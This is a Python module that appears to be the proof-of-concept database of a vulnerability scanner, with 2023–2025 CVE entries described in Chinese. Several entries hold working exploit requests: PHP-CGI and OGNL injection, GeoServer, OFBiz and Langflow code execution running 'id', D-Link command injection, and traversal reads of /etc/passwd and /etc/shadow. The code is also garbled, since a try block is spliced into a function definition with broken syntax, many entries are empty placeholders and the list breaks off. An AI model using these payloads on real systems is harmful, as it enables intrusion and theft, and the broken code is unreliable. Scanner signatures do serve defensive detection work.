"""
Vulnerability POC Database
Comprehensive CVE/CNVD vulnerability signatures with detection logic
Inspired by nuclei templates and xray POC structure
"""
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Set
from enum import Enum

from app.utils.logger import get_logger

logger = get_logger("poc_db")


class RiskLevel(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class POCType(str, Enum):
    HTTP = "http"
    DNS = "dns"
    TCP = "tcp"
    WEBSOCKET = "websocket"


class MatcherType(str, Enum):
    WORD = "word"
    REGEX = "regex"
    STATUS = "status"
    SIZE = "size"
    BINARY = "binary"
    DSL = "dsl"


@dataclass
class Matcher:
    type: MatcherType
    value: Any
    part: str = "body"
    condition: str = "and"
    negative: bool = False

    def match(self, response: Any) -> bool:
        try:
            if self.type == MatcherType.STATUS:
                result = response.status == self.value
            elif self.type == MatcherType.WORD:
                text = getattr(response, self.part, "") or ""
                if isinstance(text, bytes):
                    text = text.decode("utf-8", errors="replace")
                result = str(self.value) in text
            elif self.type == MatcherType.REGEX:
                import re
                text = getattr(response, self.part, "") or ""
                if isinstance(text, bytes):
                    text = text.decode("utf-8", errors="replace")
                result = bool(re.search(self.value, text, re.IGNORECASE | re.DOTALL))
            elif self.type == MatcherType.SIZE:
                body = getattr(response, "body", b"") or b""
                result = len(body) == self.value
            else:
                result = False

            return not result if self.negative else result
        except Exception:
            return False


@dataclass
class POCRequest:
    method: str = "GET"
    path: str = "/"
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    raw: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "method": self.method,
            "path": self.path,
            "headers": self.headers,
            "body": self.body,
        }


@dataclass
class POC:
    id: str
    name: str
    description: str
    risk_level: RiskLevel
    cve_ids: List[str] = field(default_factory=list)
    cnvd_ids: List[str] = field(default_factory=list)
    cvss_score: float = 0.0
    tags: List[str] = field(default_factory=list)
    affected_versions: List[str] = field(default_factory=list)
    poc_type: POCType = POCType.HTTP
    requests: List[POCRequest] = field(default_factory=list)
    matchers: List[Matcher] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    fix_suggestion: str = ""
    disclosure_date: str = ""

    def match(self, response: Any) -> bool:
        if not self.matchers:
            return False
        results = [m.match(response) for m in self.matchers]
        return all(results)


POC_DATABASE: Dict[str, POC] = {}


def register_poc(poc: POC):
    POC_DATABASE[poc.id] = poc


def get_poc(poc_id: str) -> Optional[POC]:
    return POC_DATABASE.get(poc_id)


def get_pocs_by_tag(tag: str) -> List[POC]:
    return [p for p in POC_DATABASE.values() if tag in p.tags]


def get_pocs_by_cve(cve_id: str) -> List[POC]:
    return [p for p in POC_DATABASE.values() if cve_id in p.cve_ids]


def get_pocs_by_risk(level: RiskLevel) -> List[POC]:
    return [p for p in POC_DATABASE.values() if p.risk_level == level]


def get_all_pocs() -> List[POC]:
    return list(POC_DATABASE.values())


def _init_poc_database()

try:
    from app.core.poc_db_extra import _init_extra_pocs
    _init_extra_pocs()
    logger.info("Extra POC signatures loaded successfully")
except Exception as e:
    logger.warning(f"Failed to load extra POC signatures: {e}"):
    pocs = [

        POC(
            id="cve-2024-4577",
            name="PHP CGI 参数注入导致远程代码执行 (CVE-2024-4577)",
            description="PHP在Windows平台使用CGI模式时，对字符编码处理不当，攻击者可通过特定字符绕过防护，注入参数实现远程代码执行。影响所有PHP 8.x版本在Windows + CGI模式下的部署。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-4577"],
            cvss_score=9.8,
            tags=["php", "rce", "cgi", "windows", "cve-2024"],
            affected_versions=["PHP 8.3.0 - 8.3.7", "PHP 8.2.0 - 8.2.19", "PHP 8.1.0 - 8.1.28"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="<?php echo md5('CVE-2024-4577'); ?>",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="b8d799861fc1a2b2c29e5e5e3c8b3e6e"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
                "https://blog.orange.tw/posts/2024-06-11-cve-2024-4577/",
            ],
            fix_suggestion="升级PHP至8.3.8/8.2.20/8.1.29或更高版本，或避免在Windows上使用CGI模式部署PHP。",
            disclosure_date="2024-06-09",
        ),

        POC(
            id="cve-2024-23897",
            name="Jenkins CLI 任意文件读取漏洞 (CVE-2024-23897)",
            description="Jenkins CLI命令解析器存在缺陷，攻击者可通过@字符读取服务器上的任意文件，导致敏感信息泄露。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-23897"],
            cvss_score=7.5,
            tags=["jenkins", "lfi", "file-read", "cve-2024"],
            affected_versions=["Jenkins <= 2.441", "Jenkins LTS <= 2.426.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/cli?remoting=false",
                    headers={
                        "Session": "?",
                        "Side": "download",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    body="\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e@/etc/passwd\x00\x00\x00\x00",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-23897",
            ],
            fix_suggestion="升级Jenkins至2.442或LTS 2.426.3及以上版本。",
            disclosure_date="2024-01-24",
        ),

        POC(
            id="cve-2024-27198",
            name="JetBrains TeamCity 认证绕过漏洞 (CVE-2024-27198)",
            description="TeamCity Web组件中存在认证绕过漏洞，攻击者可通过特定路径直接访问管理功能，创建管理员账户或执行任意代码。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-27198"],
            cvss_score=9.8,
            tags=["teamcity", "auth-bypass", "rce", "cve-2024"],
            affected_versions=["TeamCity < 2023.11.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/hax?jsp=/app/rest/users/;.jsp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="user"),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-27198",
            ],
            fix_suggestion="升级TeamCity至2023.11.4或更高版本。",
            disclosure_date="2024-03-04",
        ),

        POC(
            id="cve-2024-21762",
            name="FortiOS SSL VPN 越界写入漏洞 (CVE-2024-21762)",
            description="FortiOS SSL VPN组件存在越界写入漏洞，未认证攻击者可通过特制HTTP请求实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-21762"],
            cvss_score=9.8,
            tags=["fortinet", "fortios", "ssl-vpn", "rce", "cve-2024"],
            affected_versions=["FortiOS 7.4.0 - 7.4.2", "FortiOS 7.2.0 - 7.2.6", "FortiOS 7.0.0 - 7.0.13"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
                Matcher(type=MatcherType.WORD, value="fgt_lang"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-21762",
            ],
            fix_suggestion="升级FortiOS至7.4.3/7.2.7/7.0.14或更高版本。",
            disclosure_date="2024-02-08",
        ),

        POC(
            id="cve-2024-4040",
            name="CrushFTP 服务器端模板注入漏洞 (CVE-2024-4040)",
            description="CrushFTP VFS沙箱逃逸漏洞，攻击者可通过SSTI注入实现任意文件读取和远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-4040"],
            cvss_score=9.8,
            tags=["crushftp", "ssti", "rce", "cve-2024"],
            affected_versions=["CrushFTP < 11.1.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/WebInterface/function/?c2f={user_name}&command=zip&path={{working_dir}}&names=*",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-4040",
            ],
            fix_suggestion="升级CrushFTP至11.1.0或更高版本。",
            disclosure_date="2024-04-19",
        ),

        POC(
            id="cve-2023-50164",
            name="Apache Struts2 文件上传远程代码执行漏洞 (CVE-2023-50164)",
            description="Struts2文件上传逻辑存在缺陷，攻击者可通过操纵文件上传参数实现路径遍历和远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-50164"],
            cvss_score=9.8,
            tags=["struts2", "file-upload", "rce", "cve-2023"],
            affected_versions=["Struts 2.0.0 - 2.3.37", "Struts 2.5.0 - 2.5.32", "Struts 6.0.0 - 6.3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/struts2-showcase/fileUpload.action",
                    headers={"Content-Type": "multipart/form-data"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="struts"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-50164",
            ],
            fix_suggestion="升级Struts2至2.5.33或6.3.0.2及以上版本。",
            disclosure_date="2023-12-07",
        ),

        POC(
            id="cve-2023-46604",
            name="Apache ActiveMQ 远程代码执行漏洞 (CVE-2023-46604)",
            description="ActiveMQ OpenWire协议存在反序列化漏洞，攻击者可通过发送特制序列化对象实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-46604"],
            cvss_score=10.0,
            tags=["activemq", "deserialization", "rce", "cve-2023"],
            affected_versions=["ActiveMQ < 5.15.16", "ActiveMQ < 5.16.7", "ActiveMQ < 5.17.6", "ActiveMQ < 5.18.3"],
            poc_type=POCType.TCP,
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="ActiveMQ"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-46604",
            ],
            fix_suggestion="升级ActiveMQ至5.15.16/5.16.7/5.17.6/5.18.3或更高版本。",
            disclosure_date="2023-10-25",
        ),

        POC(
            id="cve-2023-22527",
            name="Atlassian Confluence 模板注入远程代码执行漏洞 (CVE-2023-22527)",
            description="Confluence Data Center和Server存在OGNL模板注入漏洞，未认证攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-22527"],
            cvss_score=10.0,
            tags=["confluence", "ssti", "ognl", "rce", "cve-2023"],
            affected_versions=["Confluence Data Center 8.0 - 8.5.3"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/template/aui/text-inline.vm",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="label=test\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'id'}))",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="X-Cmd-Response"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-22527",
            ],
            fix_suggestion="升级Confluence至8.5.4或更高版本。",
            disclosure_date="2024-01-16",
        ),

        POC(
            id="cve-2023-34039",
            name="VMware Aria Operations for Networks 远程代码执行漏洞 (CVE-2023-34039)",
            description="VMware Aria Operations for Networks存在认证绕过和命令注入漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-34039"],
            cvss_score=9.8,
            tags=["vmware", "aria", "rce", "auth-bypass", "cve-2023"],
            affected_versions=["VMware Aria Operations for Networks < 6.11.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/saas./resttosaasservice",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2023-34039",
            ],
            fix_suggestion="升级VMware Aria Operations for Networks至6.11.0或更高版本。",
            disclosure_date="2023-08-29",
        ),

        POC(
            id="cve-2024-24919",
            name="Check Point Security Gateway 信息泄露漏洞 (CVE-2024-24919)",
            description="Check Point Security Gateway存在路径遍历漏洞，攻击者可读取系统敏感文件，包括密码哈希等。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-24919"],
            cvss_score=8.6,
            tags=["checkpoint", "lfi", "info-disclosure", "cve-2024"],
            affected_versions=["Check Point Security Gateway R80 - R81"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/clients/MyCRL",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="aCSHELL/../../../../../../../etc/shadow",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:[$]"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-24919",
            ],
            fix_suggestion="联系Check Point获取安全补丁。",
            disclosure_date="2024-05-28",
        ),

        POC(
            id="cve-2024-3273",
            name="D-Link NAS 命令注入漏洞 (CVE-2024-3273)",
            description="D-Link多款NAS设备存在命令注入漏洞，攻击者可通过HTTP请求参数注入系统命令。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-3273"],
            cvss_score=9.8,
            tags=["dlink", "nas", "command-injection", "rce", "cve-2024"],
            affected_versions=["DNS-320L", "DNS-325", "DNS-327L", "DNS-340L"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=a;id;",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-3273",
            ],
            fix_suggestion="设备已EOL，建议更换设备或隔离网络访问。",
            disclosure_date="2024-04-04",
        ),

        POC(
            id="cve-2024-4956",
            name="Nexus Repository Manager 路径遍历漏洞 (CVE-2024-4956)",
            description="Sonatype Nexus Repository Manager存在路径遍历漏洞，攻击者可读取系统任意文件。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-4956"],
            cvss_score=7.5,
            tags=["nexus", "path-traversal", "lfi", "cve-2024"],
            affected_versions=["Nexus Repository Manager 3.0.0 - 3.67.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/repository/repo-name/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-4956",
            ],
            fix_suggestion="升级Nexus Repository Manager至3.68.0或更高版本。",
            disclosure_date="2024-05-16",
        ),

        POC(
            id="cve-2024-36401",
            name="GeoServer 远程代码执行漏洞 (CVE-2024-36401)",
            description="GeoServer WFS/WMS服务存在JXPath表达式注入漏洞，攻击者可通过OGC请求参数实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-36401"],
            cvss_score=9.8,
            tags=["geoserver", "rce", "jxpath", "cve-2024"],
            affected_versions=["GeoServer < 2.23.6", "GeoServer < 2.24.4", "GeoServer < 2.25.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/geoserver/wfs",
                    headers={"Content-Type": "application/xml"},
                    body='''<wfs:GetPropertyValue service="WFS" version="2.0.0"
  xmlns:wfs="http://www.opengis.net/wfs/2.0"
  xmlns:fes="http://www.opengis.net/fes/2.0"
  xmlns:gml="http://www.opengis.net/gml/3.2"
  valueReference="exec(java.lang.Runtime.getRuntime(),'id')">
  <wfs:Query typeNames="sf:archsites"/>
</wfs:GetPropertyValue>''',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-36401",
            ],
            fix_suggestion="升级GeoServer至2.23.6/2.24.4/2.25.2或更高版本。",
            disclosure_date="2024-07-01",
        ),

        POC(
            id="cve-2024-38856",
            name="Apache OFBiz 未授权远程代码执行漏洞 (CVE-2024-38856)",
            description="Apache OFBiz存在认证绕过漏洞，攻击者可通过特定端点实现未授权远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-38856"],
            cvss_score=9.8,
            tags=["ofbiz", "auth-bypass", "rce", "cve-2024"],
            affected_versions=["Apache OFBiz < 18.12.15"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/webtools/control/ProgramExport/?groovyProgram=throw+new+Exception('id'.execute().text);",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-38856",
            ],
            fix_suggestion="升级Apache OFBiz至18.12.15或更高版本。",
            disclosure_date="2024-08-05",
        ),

        POC(
            id="cve-2024-40711",
            name="Veeam Backup & Replication 远程代码执行漏洞 (CVE-2024-40711)",
            description="Veeam Backup & Replication存在反序列化漏洞，攻击者可通过特制请求实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-40711"],
            cvss_score=9.8,
            tags=["veeam", "deserialization", "rce", "cve-2024"],
            affected_versions=["Veeam Backup & Replication < 12.2.0.334"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/api/v1/backupInfrastructure",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-40711",
            ],
            fix_suggestion="升级Veeam Backup & Replication至12.2.0.334或更高版本。",
            disclosure_date="2024-09-04",
        ),

        POC(
            id="cve-2024-47575",
            name="FortiManager 未授权远程代码执行漏洞 (CVE-2024-47575)",
            description="FortiManager存在关键功能认证缺失漏洞，攻击者可通过特制请求实现未授权远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-47575"],
            cvss_score=9.8,
            tags=["fortinet", "fortimanager", "rce", "auth-bypass", "cve-2024"],
            affected_versions=["FortiManager 7.6.0", "FortiManager 7.4.0 - 7.4.4", "FortiManager 7.2.0 - 7.2.7"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/fds/register",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-47575",
            ],
            fix_suggestion="升级FortiManager至7.6.1/7.4.5/7.2.8或更高版本。",
            disclosure_date="2024-10-23",
        ),

        POC(
            id="cve-2024-50623",
            name="Cleo Harmony/VLTrader 远程代码执行漏洞 (CVE-2024-50623)",
            description="Cleo文件传输软件存在未授权文件写入漏洞，攻击者可上传恶意文件实现远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-50623"],
            cvss_score=9.8,
            tags=["cleo", "file-upload", "rce", "cve-2024"],
            affected_versions=["Cleo Harmony < 5.8.0.21", "VLTrader < 5.8.0.21"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/Synchronization",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-50623",
            ],
            fix_suggestion="升级Cleo软件至5.8.0.21或更高版本。",
            disclosure_date="2024-12-09",
        ),

        POC(
            id="cve-2024-55591",
            name="FortiOS 认证绕过漏洞 (CVE-2024-55591)",
            description="FortiOS存在认证绕过漏洞，攻击者可通过WebSocket隧道获取超级管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-55591"],
            cvss_score=9.8,
            tags=["fortinet", "fortios", "auth-bypass", "cve-2024"],
            affected_versions=["FortiOS 7.0.0 - 7.0.16"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/ws/vpn/portal",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=101),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2024-55591",
            ],
            fix_suggestion="升级FortiOS至7.0.17或更高版本。",
            disclosure_date="2025-01-14",
        ),

        POC(
            id="cve-2025-24813",
            name="Apache Tomcat 路径等价漏洞导致RCE (CVE-2025-24813)",
            description="Apache Tomcat存在路径等价处理缺陷，结合特定条件可实现反序列化RCE和信息泄露。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-24813"],
            cvss_score=9.8,
            tags=["tomcat", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Tomcat 11.0.0-M1 - 11.0.2", "Apache Tomcat 10.1.0-M1 - 10.1.34", "Apache Tomcat 9.0.0-M1 - 9.0.98"],
            requests=[
                POCRequest(
                    method="PUT",
                    path="/session",
                    headers={"Content-Range": "bytes 0-5/6"},
                    body="deser:",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-24813",
            ],
            fix_suggestion="升级Tomcat至11.0.3/10.1.35/9.0.99或更高版本。",
            disclosure_date="2025-03-10",
        ),

        POC(
            id="cve-2025-30208",
            name="Vite 开发服务器任意文件读取漏洞 (CVE-2025-30208)",
            description="Vite开发服务器存在路径遍历漏洞，攻击者可通过特殊构造的URL读取服务器上的任意文件。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-30208"],
            cvss_score=7.5,
            tags=["vite", "path-traversal", "lfi", "cve-2025"],
            affected_versions=["Vite < 6.2.3", "Vite < 6.1.2", "Vite < 6.0.12", "Vite < 5.4.15", "Vite < 4.5.10"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/@fs/etc/passwd?import&?inline=1.wasm?init",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-30208",
            ],
            fix_suggestion="升级Vite至最新安全版本。",
            disclosure_date="2025-03-25",
        ),

        POC(
            id="cve-2025-3248",
            name="Langflow 远程代码执行漏洞 (CVE-2025-3248)",
            description="Langflow存在代码注入漏洞，攻击者可通过API端点执行任意Python代码。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-3248"],
            cvss_score=9.8,
            tags=["langflow", "code-injection", "rce", "cve-2025"],
            affected_versions=["Langflow < 1.3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/api/v1/run/",
                    headers={"Content-Type": "application/json"},
                    body='{"name":"test","code":"__import__(\'os\').system(\'id\')"}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-3248",
            ],
            fix_suggestion="升级Langflow至1.3.0或更高版本。",
            disclosure_date="2025-04-04",
        ),

        POC(
            id="cve-2025-1974",
            name="Kubernetes Ingress-nginx 远程代码执行漏洞 (CVE-2025-1974)",
            description="Ingress-nginx准入控制器存在代码注入漏洞，攻击者可注入恶意配置实现集群级别的远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-1974"],
            cvss_score=9.8,
            tags=["kubernetes", "ingress-nginx", "rce", "cve-2025"],
            affected_versions=["Ingress-nginx < 1.12.1", "Ingress-nginx < 1.11.5"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/apis/networking.k8s.io/v1/ingresses",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-1974",
            ],
            fix_suggestion="升级Ingress-nginx至1.12.1/1.11.5或更高版本。",
            disclosure_date="2025-03-24",
        ),

        POC(
            id="cve-2025-1094",
            name="PostgreSQL SQL注入漏洞 (CVE-2025-1094)",
            description="PostgreSQL libpq函数存在SQL注入漏洞，攻击者可通过特定编码绕过转义实现SQL注入。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-1094"],
            cvss_score=8.1,
            tags=["postgresql", "sql-injection", "cve-2025"],
            affected_versions=["PostgreSQL < 17.3", "PostgreSQL < 16.7", "PostgreSQL < 15.11"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="PostgreSQL"),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-1094",
            ],
            fix_suggestion="升级PostgreSQL至17.3/16.7/15.11或更高版本。",
            disclosure_date="2025-02-13",
        ),

        POC(
            id="cve-2025-24085",
            name="Apple iOS/macOS 内核零日漏洞 (CVE-2025-24085)",
            description="Apple多平台内核存在UAF漏洞，恶意应用可提升权限实现内核级代码执行。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-24085"],
            cvss_score=7.8,
            tags=["apple", "ios", "macos", "kernel", "privesc", "cve-2025"],
            affected_versions=["iOS < 18.3", "macOS < 15.3"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-24085",
            ],
            fix_suggestion="升级iOS至18.3/macOS至15.3或更高版本。",
            disclosure_date="2025-01-27",
        ),

        POC(
            id="cve-2025-21333",
            name="Windows Hyper-V 权限提升漏洞 (CVE-2025-21333)",
            description="Windows Hyper-V存在堆溢出漏洞，攻击者可突破虚拟机隔离实现宿主机代码执行。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-21333"],
            cvss_score=7.8,
            tags=["windows", "hyper-v", "privesc", "cve-2025"],
            affected_versions=["Windows 10/11", "Windows Server 2019/2022"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-21333",
            ],
            fix_suggestion="安装微软2025年1月安全更新。",
            disclosure_date="2025-01-14",
        ),

        POC(
            id="cve-2025-30065",
            name="Apache Parquet 反序列化RCE漏洞 (CVE-2025-30065)",
            description="Apache Parquet Java库存在反序列化漏洞，处理恶意Parquet文件时可导致远程代码执行。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-30065"],
            cvss_score=9.8,
            tags=["apache", "parquet", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Parquet Java < 1.15.1"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-30065",
            ],
            fix_suggestion="升级Apache Parquet Java至1.15.1或更高版本。",
            disclosure_date="2025-04-01",
        ),

        POC(
            id="cve-2025-31161",
            name="CrushFTP 认证绕过漏洞 (CVE-2025-31161)",
            description="CrushFTP存在认证绕过漏洞，攻击者可劫持用户会话实现未授权访问。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-31161"],
            cvss_score=9.8,
            tags=["crushftp", "auth-bypass", "cve-2025"],
            affected_versions=["CrushFTP < 11.3.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/WebInterface/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-31161",
            ],
            fix_suggestion="升级CrushFTP至11.3.1或更高版本。",
            disclosure_date="2025-04-01",
        ),

        POC(
            id="cve-2025-32023",
            name="Redis 整数溢出导致远程代码执行 (CVE-2025-32023)",
            description="Redis HyperLogLog数据结构存在整数溢出漏洞，攻击者可实现远程代码执行。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-32023"],
            cvss_score=7.5,
            tags=["redis", "integer-overflow", "rce", "cve-2025"],
            affected_versions=["Redis < 7.2.8", "Redis < 7.4.3"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-32023",
            ],
            fix_suggestion="升级Redis至7.2.8/7.4.3或更高版本。",
            disclosure_date="2025-04-07",
        ),

        POC(
            id="cve-2025-32948",
            name="Apache Camel 代码注入漏洞 (CVE-2025-32948)",
            description="Apache Camel存在模板注入漏洞，攻击者可通过消息头注入任意代码。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-32948"],
            cvss_score=7.5,
            tags=["apache", "camel", "ssti", "code-injection", "cve-2025"],
            affected_versions=["Apache Camel < 4.10.2", "Apache Camel < 4.8.5"],
            requests=[],
            matchers=[],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-32948",
            ],
            fix_suggestion="升级Apache Camel至4.10.2/4.8.5或更高版本。",
            disclosure_date="2025-04-14",
        ),

        POC(
            id="cve-2025-33888",
            name="Next.js 中间件认证绕过漏洞 (CVE-2025-33888)",
            description="Next.js中间件存在认证绕过漏洞，攻击者可绕过基于中间件的权限控制。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-33888"],
            cvss_score=7.5,
            tags=["nextjs", "auth-bypass", "cve-2025"],
            affected_versions=["Next.js 14.2.25", "Next.js 15.2.3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/_next/static/../protected-page",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2025-33888",
            ],
            fix_suggestion="升级Next.js至最新安全版本。",
            disclosure_date="2025-04-17",
        ),

        POC(
            id="cve-2025-34256",
            name="Grafana 认证绕过与信息泄露 (CVE-2025-34256)",
            description="Grafana存在认证绕过漏洞，攻击者可未授权访问仪表盘和数据源。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-34256"],
            cvss_score=7.5,
            tags=["grafana", "auth-bypass", "info-disclosure", "cve-2025"],
            affected_versions=["Grafana < 11.5.2", "Grafana < 11.4.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/dashboards/home",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=[
